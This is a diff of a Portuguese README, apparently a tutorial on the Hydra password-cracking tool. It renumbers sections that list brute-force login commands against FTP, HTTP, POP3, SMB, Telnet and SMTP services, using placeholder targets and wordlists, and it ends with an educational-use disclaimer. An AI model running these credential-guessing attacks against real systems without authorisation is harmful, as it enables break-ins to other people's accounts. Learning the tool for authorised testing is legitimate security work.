@@ -44,38 +44,29 @@ Para sistemas baseados no Debian (como o Ubuntu):
 Após a instalação, você pode verificar se o Hydra está funcionando corretamente executando o comando:
 -  ```bash
     hydra --version
-## Comandos Básicos do Hydra
+4. ## Comandos Básicos do Hydra
 <justify>
 Nos comandos o “username” é o nome do usuário que você deseja atacar e “password_list.txt” é o nome do arquivo de lista de senhas que você deseja usar para o ataque. O “target_ip” é o endereço IP do servidor que você deseja atacar.
 </justify>
-### Verificação de Hosts Ativos
-
-
-Força Bruta em FTP:
+4.1 Força Bruta em FTP:
 
 -  ```bash
     hydra -l username -P password_list.txt ftp://target_ip
-
-Força Bruta em HTTP:
+4.2 Força Bruta em HTTP:
 - ```bash
     hydra -L user_list.txt -P password_list.txt http://target_ip
-
-Força Bruta em POP3:
+4.3 Força Bruta em POP3:
 - ```bash
     hydra -l username -P password_list.txt pop3://target_ip
-
-Força Bruta em SMB:
+4.4 Força Bruta em SMB:
 - ```bash
     hydra -l username -P password_list.txt smb://target_ip
-
-Força Bruta em Telnet:
+4.5 Força Bruta em Telnet:
 - ```bash
    hydra -l username -P password_list.txt telnet://target_ip
-
-Força Bruta em SMTP:
+4.6 Força Bruta em SMTP:
 - ```bash
    hydra -l username -P password_list.txt smtp://target_ip
-
 ## Aviso
 <justify>
 Este repositório é apenas para fins educacionais. Não promovemos atividades ilegais ou antiéticas. Certifique-se de obedecer às leis locais e diretrizes éticas ao usar o Hydra e outras ferramentas de segurança.
